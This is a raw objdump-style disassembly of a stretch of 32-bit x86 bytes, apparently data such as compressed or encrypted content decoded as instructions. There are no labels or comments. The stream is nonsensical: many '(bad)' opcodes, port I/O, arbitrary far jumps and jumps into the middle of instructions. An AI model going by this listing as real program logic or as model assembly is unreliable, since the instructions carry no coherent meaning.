  419fa5:	mov    ecx,0xe1187c40
  419faa:	adc    al,0xd3
  419fac:	cs push 0xa00508fd
  419fb2:	jnp    0x41a00c
  419fb4:	jmp    eax
  419fb6:	mov    eax,ds:0xbcc0d9f0
  419fbb:	jae    0x419f7b
  419fbd:	sbb    al,0x17
  419fbf:	inc    edi
  419fc0:	in     al,0x3b
  419fc2:	mov    ecx,0x1ba345c4
  419fc7:	mov    BYTE PTR [edi-0x29ca4f9b],ah
  419fcd:	test   BYTE PTR [ebp+eax*4+0x18],0xb9
  419fd2:	fild   WORD PTR [ebx-0x18c48fb5]
  419fd8:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  419fda:	inc    eax
  419fdb:	jae    0x419fbd
  419fdd:	lahf   
  419fde:	sbb    esi,DWORD PTR [edx-0x42]
  419fe1:	shr    BYTE PTR [ecx+0x1c],1
  419fe4:	in     al,dx
  419fe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fe6:	adc    edi,DWORD PTR [edx-0x7b472fec]
  419fec:	je     0x419f90
  419fee:	sub    eax,0x24c545af
  419ff3:	icebp  
  419ff4:	ins    DWORD PTR es:[edi],dx
  419ff5:	push   0xffffffe0
  419ff7:	dec    edx
  419ff8:	sbb    al,0xc9
  419ffa:	sahf   
  419ffb:	(bad)  
  419ffc:	xor    BYTE PTR [ebp+ebx*1-0x16],cl
  41a000:	sub    eax,0xf981a2e7
  41a005:	mov    ds:0xfae9cc21,eax
  41a00a:	cmp    al,bl
  41a00c:	dec    edi
  41a00d:	push   esi
  41a00e:	jl     0x419fba
  41a010:	loop   0x41a06b
  41a012:	dec    edi
  41a013:	and    dl,BYTE PTR [edx-0x37]
  41a016:	sti    
  41a017:	xchg   ecx,eax
  41a018:	mov    ds:0xefa4980c,eax
  41a01d:	pusha  
  41a01e:	xor    eax,0x4889ec
  41a023:	ret    0x9f56
  41a026:	jg     0x419ffe
  41a028:	inc    ecx
  41a029:	pop    edx
  41a02a:	mov    edx,0x3ba91be8
  41a02f:	retf   
  41a030:	mov    edx,0xe7013e16
  41a035:	test   al,0xbb
  41a037:	sub    eax,0xdd35d809
  41a03c:	sti    
  41a03d:	int    0x1c
  41a03f:	push   es
  41a040:	lahf   
  41a041:	out    0xf0,al
  41a043:	xor    al,0x16
  41a045:	add    DWORD PTR [ebx],ecx
  41a047:	mov    ebp,0x227d0a03
  41a04c:	jo     0x419ffe
  41a04e:	(bad)  
  41a04f:	sub    eax,0x70f345c4
  41a054:	mov    cl,0x63
  41a056:	and    al,BYTE PTR ds:0x1e45931c
  41a05c:	lds    ebx,FWORD PTR [ebx+ecx*1+0xad5cf9]
  41a063:	xchg   esi,eax
  41a064:	jle    0x419ff8
  41a066:	push   esi
  41a067:	and    bh,bl
  41a069:	shr    DWORD PTR [eax+esi*2],1
  41a06c:	mov    esi,0x54027ba5
  41a071:	inc    edx
  41a072:	jnp    0x41a082
  41a074:	sbb    eax,0x2ae54f89
  41a079:	in     al,dx
  41a07a:	idiv   BYTE PTR ds:0xbafb9e74
  41a080:	scas   eax,DWORD PTR es:[edi]
  41a081:	stos   DWORD PTR es:[edi],eax
  41a082:	shr    BYTE PTR [ecx+0x4f],1
  41a085:	repnz sti 
  41a087:	js     0x41a0b3
  41a089:	mov    al,ds:0x483ac853
  41a08e:	ret    
  41a08f:	sbb    ch,ch
  41a091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a092:	mov    ebx,0x6491992a
  41a097:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41a099:	cli    
  41a09a:	sbb    bh,bh
  41a09c:	repz xchg esp,eax
  41a09e:	mov    ecx,0x95b7924
  41a0a3:	xchg   esp,eax
  41a0a4:	jbe    0x41a10d
  41a0a6:	test   al,0x5a
  41a0a8:	neg    DWORD PTR [edi+0xb6426aa]
  41a0ae:	out    0xdb,al
  41a0b0:	sbb    ch,ch
  41a0b2:	mov    dl,0x4
  41a0b4:	or     eax,0xcc5cb985
  41a0b9:	(bad)  
  41a0ba:	sti    
  41a0bb:	out    dx,eax
  41a0bc:	cmp    esi,esi
  41a0be:	jno    0x41a067
  41a0c0:	and    edi,esp
  41a0c2:	or     esp,DWORD PTR [ecx]
  41a0c4:	xor    ch,BYTE PTR [ecx-0x70]
  41a0c7:	add    esp,DWORD PTR [esp+ebx*1+0x11]
  41a0cb:	mov    ebx,0xe7eac822
  41a0d0:	test   DWORD PTR [edx+0x37a7ee24],ecx
  41a0d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0d7:	and    bl,BYTE PTR ds:0x9cd49e99
  41a0dd:	jp     0x41a145
  41a0df:	push   edx
  41a0e0:	loop   0x41a07d
  41a0e2:	mov    ebx,0xfc642dd3
  41a0e7:	xchg   ecx,eax
  41a0e8:	inc    edx
  41a0e9:	ret    
  41a0ea:	sar    BYTE PTR [eax],1
  41a0ec:	ins    BYTE PTR es:[edi],dx
  41a0ed:	cmp    al,0xba
  41a0ef:	and    al,0x75
  41a0f1:	xor    ebx,ebx
  41a0f3:	hlt    
  41a0f4:	push   es
  41a0f5:	pop    ebx
  41a0f6:	cmp    eax,DWORD PTR [ebx]
  41a0f8:	push   ecx
  41a0f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0fb:	inc    ebx
  41a0fc:	sbb    DWORD PTR [ebp+0xa],0x75
  41a100:	pop    ds
  41a101:	fld    DWORD PTR [esi-0x27]
  41a104:	out    0xa,al
  41a106:	(bad)  
  41a107:	mov    dl,0x7b
  41a109:	pushf  
  41a10a:	stos   DWORD PTR es:[edi],eax
  41a10b:	aas    
  41a10c:	dec    edx
  41a10d:	inc    esi
  41a10e:	xor    esi,DWORD PTR [ecx-0x60eb5fa3]
  41a114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a115:	mov    edi,DWORD PTR [ecx+0x421bf94]
  41a11b:	mov    dl,0xf4
  41a11d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a11e:	mov    esp,DWORD PTR ds:0xab921f6c
  41a124:	imul   ebp,DWORD PTR [ebx],0xfffffff5
  41a127:	pop    edx
  41a128:	inc    eax
  41a129:	cmp    bh,BYTE PTR [ebp-0x17678dec]
  41a12f:	retf   
  41a130:	cmc    
  41a131:	(bad)  
  41a132:	and    ch,bh
  41a134:	cmp    eax,0x21062de8
  41a139:	stc    
  41a13a:	and    BYTE PTR [esi-0x51ba8650],bh
  41a140:	dec    ecx
  41a141:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a142:	fld    TBYTE PTR [edi+0x5d]
  41a145:	in     eax,0x73
  41a147:	sub    BYTE PTR [esi+0x677041d9],al
  41a14d:	adc    al,0xc9
  41a14f:	adc    al,0xfa
  41a151:	imul   edx,DWORD PTR [edx+edx*4+0x33],0x6a
  41a156:	addr16 jae 0x41a14e
  41a159:	xchg   esp,eax
  41a15a:	test   bh,ch
  41a15c:	adc    ebp,DWORD PTR [ebp+0xe]
  41a15f:	fistp  DWORD PTR [edx]
  41a161:	cmp    ecx,ebx
  41a163:	sub    DWORD PTR [ecx-0x27],0xffffff8b
  41a167:	jl     0x41a1a9
  41a169:	ret    0x423c
  41a16c:	sub    esp,DWORD PTR [eax+0x18a52afb]
  41a172:	imul   eax,ebx,0xa735a91f
  41a178:	add    bl,cl
  41a17a:	mov    dl,0x10
  41a17c:	mov    esp,0x450e3ba0
  41a181:	dec    ebx
  41a182:	call   0xf332:0xcfd625f7
  41a189:	dec    esi
  41a18a:	mov    esi,0xe27c1344
  41a18f:	add    al,0x77
  41a191:	nop
  41a192:	outs   dx,DWORD PTR ds:[esi]
  41a193:	mov    esi,0xcdb17f76
  41a198:	inc    eax
  41a199:	or     al,0xbb
  41a19b:	pushf  
  41a19c:	pop    ebp
  41a19d:	push   edi
  41a19e:	mov    al,0xbc
  41a1a0:	or     ecx,DWORD PTR [ecx-0x41]
  41a1a3:	test   BYTE PTR [edi+eiz*8],bl
  41a1a6:	lods   eax,DWORD PTR ds:[esi]
  41a1a7:	adc    ch,ah
  41a1a9:	pop    esi
  41a1aa:	adc    eax,0x86f57eed
  41a1af:	aaa    
  41a1b0:	fisttp QWORD PTR [esi+0x69]
  41a1b3:	adc    DWORD PTR [ebp-0x47],esp
  41a1b6:	pop    ss
  41a1b7:	jmp    0xc885:0xc27960b
  41a1be:	push   ds
  41a1bf:	repz pop esi
  41a1c1:	mov    ds:0xb923beb3,al
  41a1c6:	in     al,dx
  41a1c7:	pop    esi
  41a1c8:	push   ds
  41a1c9:	mov    ch,0x2b
  41a1cb:	add    eax,0xcab9e7b
  41a1d0:	inc    edx
  41a1d1:	daa    
  41a1d2:	adc    DWORD PTR [ecx+0xd],0xde4e3699
  41a1d9:	mov    dl,0x20
  41a1db:	aad    0x24
  41a1dd:	sbb    eax,0xa4852a49
  41a1e2:	retf   0x54d
  41a1e5:	mov    ebp,0xd8fdf1a1
  41a1ea:	xchg   ecx,eax
  41a1eb:	mov    ds:0xe86b0922,eax
  41a1f0:	push   0xc524f71d
  41a1f5:	mov    al,ds:0xfda589db
  41a1fa:	sbb    esi,DWORD PTR [esi+0x64]
  41a1fd:	rcr    BYTE PTR [esi-0x4cd8dc65],cl
  41a203:	xchg   esp,eax
  41a204:	lock addr16 jge 0x41a260
  41a208:	xchg   BYTE PTR [ecx+0x2e001e34],cl
  41a20e:	xchg   edi,eax
  41a20f:	and    ebp,edx
  41a211:	xlat   BYTE PTR ds:[ebx]
  41a212:	cmp    al,0xd
  41a214:	push   esp
  41a215:	mov    ch,0xe8
  41a217:	test   ch,ah
  41a219:	and    eax,0xc3413e88
  41a21e:	in     al,dx
  41a21f:	std    
  41a220:	outs   dx,DWORD PTR ds:[esi]
  41a221:	out    0x6b,al
  41a223:	outs   dx,DWORD PTR ds:[esi]
  41a224:	cmp    edx,DWORD PTR [ecx+0x5ad1556]
  41a22a:	mov    al,0xf0
  41a22c:	int    0x1b
  41a22e:	loope  0x41a236
  41a230:	fisttp DWORD PTR [esp+esi*8-0x4f21381]
  41a237:	int    0x8c
  41a239:	lea    esi,[ebx+0x61dfb4f4]
  41a23f:	outs   dx,BYTE PTR cs:[esi]
  41a241:	fdiv   QWORD PTR [esi+0x4bd814c4]
  41a247:	inc    ebx
  41a248:	add    eax,0x71e77757
  41a24d:	sub    ah,BYTE PTR [esi-0x7b86e951]
  41a253:	mov    dh,0x3d
  41a255:	inc    esp
  41a256:	popf   
  41a257:	and    al,0x4d
  41a259:	xor    ecx,DWORD PTR [ebp-0x571a5186]
  41a25f:	xchg   DWORD PTR [eax+0x31],ecx
  41a262:	and    al,0xf1
  41a264:	test   BYTE PTR [ebp-0x4a],bh
  41a267:	fs ror bl,1
  41a26a:	sbb    DWORD PTR [edi+edx*1+0x65e463c4],edi
  41a271:	mov    dh,BYTE PTR [ebx]
  41a273:	out    0x30,al
  41a275:	test   eax,0x2e962e96
  41a27a:	mov    bh,0x24
  41a27c:	fnstsw WORD PTR [ecx]
  41a27e:	pop    eax
  41a27f:	sbb    bh,BYTE PTR [ecx-0x8]
  41a282:	(bad)  
  41a283:	test   eax,0xcbe8310
  41a288:	bnd jne 0x41a28c
  41a28b:	div    DWORD PTR [edx-0x76]
  41a28e:	mov    ebx,0xe98187a4
  41a293:	push   ebx
  41a294:	pop    eax
  41a295:	mov    eax,0x9db56755
  41a29a:	shr    bh,1
  41a29c:	pop    esp
  41a29d:	pusha  
  41a29e:	adc    BYTE PTR [ebp-0x3c9166df],cl
  41a2a4:	add    DWORD PTR [eax],ebx
  41a2a6:	push   es
  41a2a7:	test   BYTE PTR [ebx+ebx*4-0x25],bh
  41a2ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2ad:	test   eax,0x4ed9f26c
  41a2b2:	add    ebx,DWORD PTR [ebx]
  41a2b4:	xor    DWORD PTR [eax-0x61a31b4b],0x6905a103
  41a2be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2bf:	out    0xce,al
  41a2c1:	test   DWORD PTR [esi-0x6d96e5db],edi
  41a2c7:	mov    ds:0xe5233308,eax
  41a2cc:	loop   0x41a26a
  41a2ce:	sbb    esi,eax
  41a2d0:	jecxz  0x41a284
  41a2d2:	sbb    eax,0xb7b00018
  41a2d7:	loopne 0x41a302
  41a2d9:	pop    ecx
  41a2da:	mov    ah,0x64
  41a2dc:	ins    DWORD PTR es:[edi],dx
  41a2dd:	mov    bh,0x80
  41a2df:	cmp    al,0x6d
  41a2e1:	call   0xf095:0x599f998b
  41a2e8:	cdq    
  41a2e9:	mov    edx,0xe8af0120
  41a2ee:	mov    ch,0xc4
  41a2f0:	gs pusha 
  41a2f2:	jle    0x41a34e
  41a2f4:	inc    ebp
  41a2f5:	mov    esi,ebx
  41a2f7:	in     al,0xcd
  41a2f9:	lahf   
  41a2fa:	in     eax,0x97
  41a2fc:	push   ds
  41a2fd:	sbb    DWORD PTR [esi],eax
  41a2ff:	cmp    al,0x9e
  41a301:	das    
  41a302:	adc    ebx,DWORD PTR [edi+0x73aba553]
  41a308:	rcl    edi,1
  41a30a:	in     eax,dx
  41a30b:	dec    esi
  41a30c:	(bad)  
  41a30e:	loope  0x41a33f
  41a310:	and    bl,BYTE PTR [ecx-0x53256cee]
  41a316:	and    al,bl
  41a318:	clc    
  41a319:	mov    gs,WORD PTR [edi+0x124116a7]
  41a31f:	push   es
  41a320:	jmp    0xc799:0x22baac05
  41a327:	dec    edx
  41a328:	xchg   bh,dh
  41a32a:	iret   
  41a32b:	jmp    0x41a2da
  41a32d:	call   DWORD PTR fs:[ecx]
  41a330:	not    BYTE PTR [edx]
  41a332:	push   ebx
  41a333:	ret    0xed39
  41a336:	xchg   ebp,eax
  41a337:	repnz push ecx
  41a339:	push   esp
  41a33a:	loop   0x41a394
  41a33c:	les    eax,FWORD PTR [eax+esi*4-0xc]
  41a340:	sbb    esp,DWORD PTR [edi]
  41a342:	inc    esp
  41a343:	adc    BYTE PTR [ebp+0x58],al
  41a346:	call   0xfdd8cc3d
  41a34b:	sti    
  41a34c:	sbb    bh,cl
  41a34e:	adc    al,0x40
  41a350:	dec    esp
  41a351:	jmp    0xa78bc1c9
  41a356:	sti    
  41a357:	(bad)  
  41a358:	dec    ebx
  41a359:	ret    
  41a35a:	daa    
  41a35b:	lods   al,BYTE PTR ds:[esi]
  41a35c:	pop    ebp
  41a35d:	and    eax,0x8b8b8f9e
  41a362:	loope  0x41a2e8
  41a364:	popf   
  41a365:	pop    edx
  41a366:	std    
  41a367:	ret    0x9b37
  41a36a:	xlat   BYTE PTR ds:[ebx]
  41a36b:	(bad)  
  41a36c:	rcl    DWORD PTR [esi],1
  41a36e:	mov    al,0x76
  41a370:	inc    ebx
  41a371:	stc    
  41a372:	sbb    cl,BYTE PTR [edx]
  41a374:	inc    edi
  41a375:	pusha  
  41a376:	loopne 0x41a327
  41a378:	and    ebx,ebp
  41a37a:	jge    0x41a37a
  41a37c:	out    dx,al
  41a37d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a37e:	sti    
  41a37f:	rol    BYTE PTR [ebp+0x2b],1
  41a382:	xor    al,0xa0
  41a384:	pop    ebx
  41a385:	jmp    0x463e:0xc03f3c85
  41a38c:	int3   
  41a38d:	call   0x66ba:0xbd08991b
  41a394:	enter  0xa93b,0x2a
  41a398:	sub    eax,0x2824ea95
  41a39d:	push   ds
  41a39e:	(bad)
  41a3a1:	lahf   
  41a3a2:	or     ebx,edi
  41a3a4:	mov    ds:0xa337b6b5,eax
  41a3a9:	add    DWORD PTR [ecx],eax
  41a3ab:	mov    bh,BYTE PTR [ebp+0xa]
  41a3ae:	pushf  
  41a3af:	mov    dh,0xee
  41a3b1:	test   edx,ebp
  41a3b3:	hlt    
  41a3b4:	pop    ds
  41a3b5:	fs jmp 0x1bdbe710
  41a3bb:	cmp    DWORD PTR [ecx+ecx*8+0xe],edi
  41a3bf:	mov    al,ss:0x2148ed14
  41a3c5:	inc    eax
  41a3c6:	mov    bh,0x54
  41a3c8:	jge    0x41a3de
  41a3ca:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3cc:	push   ebp
  41a3cd:	push   ds
  41a3ce:	sbb    dh,dl
  41a3d0:	pusha  
  41a3d1:	pusha  
  41a3d2:	mov    dh,0x58
  41a3d4:	or     cl,0x20
  41a3d7:	mov    dl,BYTE PTR [ebx]
  41a3d9:	xchg   ebp,eax
  41a3da:	xchg   ecx,eax
  41a3db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3dc:	xor    eax,0xbee85355
  41a3e1:	imul   eax,esi,0x4d692363
  41a3e7:	in     al,0x6a
  41a3e9:	shl    BYTE PTR ds:0xebd8d5cb,0x44
  41a3f0:	jge    0x41a460
  41a3f2:	dec    esi
  41a3f3:	inc    edi
  41a3f4:	sbb    DWORD PTR [edx],edx
  41a3f6:	and    BYTE PTR [ebx+0x20],al
  41a3f9:	test   eax,0x5092bca
  41a3fe:	fld    st(1)
  41a400:	jb     0x41a39b
  41a402:	mov    ebx,0x69d28b7a
  41a407:	push   0xffffffbe
  41a409:	jnp    0x41a3e4
  41a40b:	jl     0x41a475
  41a40d:	jbe    0x41a3c5
  41a40f:	je     0x41a3ca
  41a411:	cdq    
  41a412:	xchg   esi,eax
  41a413:	dec    esi
  41a414:	in     eax,0xc5
  41a416:	(bad)  
  41a417:	cmc    
  41a418:	or     eax,0x53551521
  41a41d:	fisubr WORD PTR [edi-0x4c00b30f]
  41a423:	les    ecx,FWORD PTR [ebp+0x31]
  41a426:	adc    al,BYTE PTR [esp+eax*2+0x5d2c6ba2]
  41a42d:	(bad)  
  41a42f:	in     eax,0xc7
  41a431:	xchg   ebp,eax
  41a432:	pop    es
  41a433:	pop    ebp
  41a434:	daa    
  41a435:	dec    edx
  41a436:	mov    bh,0xa4
  41a438:	pop    ds
  41a439:	adc    al,BYTE PTR [ebp+0x7c]
  41a43c:	mov    ch,0x28
  41a43e:	out    0xea,al
  41a440:	(bad)  
  41a441:	cmp    ebp,DWORD PTR [esi]
  41a443:	or     eax,0x3b910925
  41a448:	jne    0x41a49b
  41a44a:	popf   
  41a44b:	jl     0x41a43e
  41a44d:	mov    ds:0xfd03907b,al
  41a452:	lahf   
  41a453:	fdivp  st(7),st
  41a455:	push   0x48f080b
  41a45a:	mov    bh,0x34
  41a45c:	leave  
  41a45d:	cld    
  41a45e:	xchg   edi,eax
  41a45f:	add    BYTE PTR [ebp-0xe],0x63
  41a463:	in     al,dx
  41a464:	push   ecx
  41a465:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a466:	lock jecxz 0x41a48b
  41a469:	dec    ecx
  41a46a:	lock cs call 0x7316:0xddfbf5d3
  41a473:	push   edi
  41a474:	aad    0xf7
  41a476:	mov    ebp,0xdbdeeaee
  41a47b:	mov    dl,0x1f
  41a47d:	cmp    DWORD PTR [edx-0x76],esp
  41a480:	cmp    al,0xd1
  41a482:	sub    al,0xae
  41a484:	fbld   TBYTE PTR [ecx-0x5157e8d5]
  41a48a:	test   al,0xb6
  41a48c:	ss add al,0x48
  41a48f:	mov    esi,0x86873d80
  41a494:	and    ebp,edi
  41a496:	mov    dl,0x4
  41a498:	(bad)  
  41a499:	mov    bl,0x6b
  41a49b:	out    dx,al
  41a49c:	push   ebx
  41a49d:	stos   BYTE PTR es:[edi],al
  41a49e:	adc    eax,0x3fa3f4ad
  41a4a3:	test   BYTE PTR [edx+0x19],al
  41a4a6:	aad    0xd1
  41a4a8:	xchg   edi,eax
  41a4a9:	and    al,0xb2
  41a4ab:	xchg   esp,eax
  41a4ac:	add    al,0x48
  41a4ae:	ins    BYTE PTR es:[edi],dx
  41a4af:	inc    ebx
  41a4b0:	jmp    0x11f106ad
  41a4b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4b6:	mov    eax,0xfb640efc
  41a4bb:	mov    esp,DWORD PTR [ebx+0x208c2d3b]
  41a4c1:	dec    ecx
  41a4c2:	and    cl,BYTE PTR [esi+0xd1ecf13]
  41a4c8:	pusha  
  41a4c9:	dec    ebx
  41a4ca:	inc    ebx
  41a4cb:	add    dh,dh
  41a4cd:	data16 aas 
  41a4cf:	sbb    esp,ebx
  41a4d1:	js     0x41a502
  41a4d3:	and    ebx,DWORD PTR [ebp+esi*4+0x399031e6]
  41a4da:	inc    edx
  41a4db:	ret    0xe59
  41a4de:	in     eax,dx
  41a4df:	xor    edi,DWORD PTR [eax+0x8]
  41a4e2:	mov    ebp,0x6d4b9684
  41a4e7:	sbb    esi,DWORD PTR [eax]
  41a4e9:	cmp    al,bl
  41a4eb:	(bad)  
  41a4ec:	hlt    
  41a4ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4ee:	mov    ebp,0xb5ce8f22
  41a4f3:	and    al,0x4b
  41a4f5:	retf   0xc970
  41a4f8:	and    eax,0xe8e815b4
  41a4fd:	rol    DWORD PTR [ecx-0x1b],cl
  41a500:	and    eax,0x916584a9
  41a505:	push   ebp
  41a506:	inc    esp
  41a507:	rcr    DWORD PTR [edx-0x8044453],1
  41a50d:	pop    es
  41a50e:	xchg   esi,eax
  41a50f:	push   es
  41a510:	xchg   ebx,eax
  41a511:	mov    ds:0x991dc42d,al
  41a516:	adc    ebx,esp
  41a518:	add    DWORD PTR [ecx-0x2d],ebx
  41a51b:	sub    ch,BYTE PTR [edx-0x5a]
  41a51e:	dec    ebx
  41a51f:	punpckhdq mm6,QWORD PTR [ecx+esi*8]
  41a523:	push   edi
  41a524:	push   eax
  41a525:	push   edx
  41a526:	cmp    ebp,DWORD PTR [eax+ebx*1-0x780b4ffc]
  41a52d:	pop    es
  41a52e:	jno    0x41a54b
  41a530:	xchg   ebp,eax
  41a531:	ficom  WORD PTR [ebx]
  41a533:	out    dx,al
  41a534:	mov    ds:0x1ad3fa2c,al
  41a539:	imul   ebp,DWORD PTR [ebx],0x11fe69e4
  41a53f:	push   eax
  41a540:	inc    esi
  41a541:	call   0x80e1:0x4b33edfb
  41a548:	or     al,0xcd
  41a54a:	or     ah,BYTE PTR [ebp-0x4adcc615]
  41a550:	and    ch,dh
  41a552:	add    ah,BYTE PTR [esp+ebx*4-0x5c]
  41a556:	sti    
  41a557:	add    eax,0x45cf3ac4
  41a55c:	or     DWORD PTR [edx],ebx
  41a55e:	stc    
  41a55f:	mov    ebx,0x84e8a9df
  41a564:	daa    
  41a565:	mov    ds:0xa76a3566,al
  41a56a:	imul   edi,DWORD PTR [edi+0x55],0xffffffee
  41a56e:	dec    ebp
  41a56f:	add    al,0x83
  41a571:	cmp    eax,0x2c8ffa53
  41a576:	shl    esp,0xea
  41a579:	inc    esi
  41a57a:	in     eax,0x5e
  41a57c:	adc    esi,DWORD PTR [eax-0x61]
  41a57f:	call   0xa97d4bdb
  41a584:	stc    
  41a585:	mov    WORD PTR [ebx-0x1e],gs
  41a588:	dec    edx
  41a589:	sahf   
  41a58a:	or     edi,eax
  41a58c:	inc    esp
  41a58d:	mov    al,0x34
  41a590:	push   ebp
  41a591:	xchg   edx,eax
  41a592:	aam    0x55
  41a594:	sbb    cl,cl
  41a596:	mov    eax,0x4ff4d30f
  41a59b:	ins    DWORD PTR es:[edi],dx
  41a59c:	sbb    BYTE PTR [ebx+ebx*2+0x180bddf3],ah
  41a5a3:	je     0x41a56e
  41a5a5:	dec    ebx
  41a5a6:	pop    ebx
  41a5a7:	sbb    eax,0x34b5e0ad
  41a5ac:	add    edi,DWORD PTR [edx+0x59]
  41a5af:	pop    edi
  41a5b0:	cmc    
  41a5b1:	mov    ss,WORD PTR [edx-0x14]
  41a5b4:	out    dx,eax
  41a5b5:	cdq    
  41a5b6:	mov    ecx,ebp
  41a5b8:	sbb    eax,0x9d247fb9
  41a5bd:	dec    ecx
  41a5be:	mov    esi,0x39a74bf9
  41a5c3:	jns    0x41a5fa
  41a5c5:	push   ebx
  41a5c6:	addr16 in al,dx
  41a5c8:	(bad)  
  41a5c9:	jmp    0xcb2c8853
  41a5ce:	cwde   
  41a5cf:	shl    ah,cl
  41a5d1:	out    0xcb,al
  41a5d3:	xor    BYTE PTR [edi+0x6b],bl
  41a5d6:	jbe    0x41a642
  41a5d8:	mov    ds:0xf5a4b05e,al
  41a5dd:	mov    ds:0xa8de3beb,eax
  41a5e2:	pop    eax
  41a5e3:	ret    
  41a5e4:	rcr    ebx,0x11
  41a5e7:	das    
  41a5e8:	cmp    esp,DWORD PTR [ebp+0x152b483b]
  41a5ee:	cdq    
  41a5ef:	jg     0x41a650
  41a5f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5f2:	cmp    ecx,DWORD PTR [ebx+0x6330541d]
  41a5f8:	shr    bp,0x50
  41a5fc:	ss push 0x56
  41a5ff:	fdiv   st(7),st
  41a601:	imul   edx,DWORD PTR [eax],0x6dfb4581
  41a607:	repz es cdq 
  41a60a:	sbb    edx,DWORD PTR [esi-0x42de71e8]
  41a610:	xor    eax,0xcf5e101d
  41a615:	ds retf 
  41a617:	fs (bad) 
  41a619:	loopne 0x41a5ba
  41a61b:	push   es
  41a61c:	dec    esi
  41a61d:	pushf  
  41a61e:	sti    
  41a61f:	push   ecx
  41a620:	jle    0x41a62c
  41a622:	cmc    
  41a623:	jno    0x41a654
  41a625:	jl     0x41a659
  41a627:	xchg   esp,eax
  41a628:	jb     0x41a65d
  41a62a:	mov    ebp,0x85564e24
  41a62f:	add    ch,ah
  41a631:	push   esi
  41a632:	sub    dl,0x79
  41a635:	mov    esp,0xc91cf2d7
  41a63a:	mov    bl,0xd2
  41a63c:	sahf   
  41a63d:	inc    esi
  41a63e:	mov    ecx,es
  41a640:	dec    eax
  41a641:	push   ds
  41a642:	sar    BYTE PTR [ebx],1
  41a644:	or     eax,0x1a5e2ba1
  41a649:	xchg   esp,eax
  41a64a:	nop
  41a64b:	push   esp
  41a64c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a64d:	push   ebp
  41a64e:	sbb    al,0xdf
  41a650:	aas    
  41a651:	pop    ebp
  41a652:	mov    bh,0x84
  41a654:	jae    0x41a692
  41a656:	(bad)  
  41a657:	mov    WORD PTR [esi],es
  41a659:	outs   dx,DWORD PTR ds:[esi]
  41a65a:	cmp    al,0x3
  41a65c:	sbb    BYTE PTR [edx+0x5c85c83e],dl
  41a662:	mov    cl,0x70
  41a664:	xchg   DWORD PTR [edi+esi*4+0x3fec6844],esi
  41a66b:	mov    ah,0x79
  41a66d:	xor    ebx,DWORD PTR [esi-0x45504c80]
  41a673:	in     al,0xe2
  41a675:	test   bl,dh
  41a677:	call   0x447f:0xf4ba0aa6
  41a67e:	pop    edx
  41a67f:	ja     0x41a657
  41a681:	lea    esi,[esi+ebx*8+0x7]
  41a685:	jne    0x41a6a4
  41a687:	lea    edi,[ebx-0x2e]
  41a68a:	sti    
  41a68b:	mov    ebp,0xfcad0c09
  41a690:	mov    cl,0x29
  41a692:	xor    esi,DWORD PTR [esi+ebp*8+0x34052ae7]
  41a699:	cdq    
  41a69a:	loopne 0x41a6f7
  41a69c:	pop    ecx
  41a69d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a69e:	ins    BYTE PTR es:[edi],dx
  41a69f:	cmp    ah,BYTE PTR [ebp-0x27190d6e]
  41a6a5:	xor    BYTE PTR [esi-0x6186dc4b],dl
  41a6ab:	scas   al,BYTE PTR es:[edi]
  41a6ac:	fs repz jmp 0x41a6a9
  41a6b0:	sbb    al,0x90
  41a6b2:	pushf  
  41a6b3:	push   0xffffffa3
  41a6b5:	or     bh,BYTE PTR [edi+ebx*8-0x10]
  41a6b9:	ss mov ebp,0xf22933c4
  41a6bf:	mov    WORD PTR [edi+0x3a],ss
  41a6c2:	cmp    ecx,0xffffffa4
  41a6c5:	xor    eax,0x4ac543e9
  41a6ca:	aas    
  41a6cb:	lock daa 
  41a6cd:	pop    edx
  41a6ce:	xlat   BYTE PTR ds:[ebx]
  41a6cf:	push   ebp
  41a6d0:	jle    0x41a67c
  41a6d2:	outs   dx,BYTE PTR ds:[esi]
  41a6d3:	and    edx,DWORD PTR [ebx+0x6a]
  41a6d6:	js     0x41a6e4
  41a6d8:	in     al,dx
  41a6d9:	mov    ebx,0xd8a5d4b7
  41a6de:	stos   DWORD PTR es:[edi],eax
  41a6df:	mov    al,ds:0x4d39241
  41a6e4:	and    al,0x27
  41a6e6:	mov    ah,0x2d
  41a6e8:	and    cl,BYTE PTR [ecx-0x4a31e306]
  41a6ee:	in     eax,dx
  41a6ef:	jnp    0x41a69d
  41a6f1:	shl    DWORD PTR [edx-0x56],cl
  41a6f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6f5:	sbb    bh,bh
  41a6f7:	in     al,0xdd
  41a6f9:	or     DWORD PTR [eax-0x6486e8d5],0x3df7d1d2
  41a703:	out    dx,al
  41a704:	lods   al,BYTE PTR ds:[esi]
  41a705:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a706:	dec    ebx
  41a707:	lds    edx,FWORD PTR [eax-0x13]
  41a70a:	pop    esp
  41a70b:	xchg   esi,eax
  41a70c:	add    ecx,0x2e
  41a70f:	icebp  
  41a710:	in     al,0x48
  41a712:	mov    dh,0x74
  41a714:	jmp    0x3b96:0xd5467c30
  41a71b:	jmp    0x5b78ccee
  41a720:	out    0x4c,eax
  41a722:	push   eax
  41a723:	pop    ecx
  41a724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
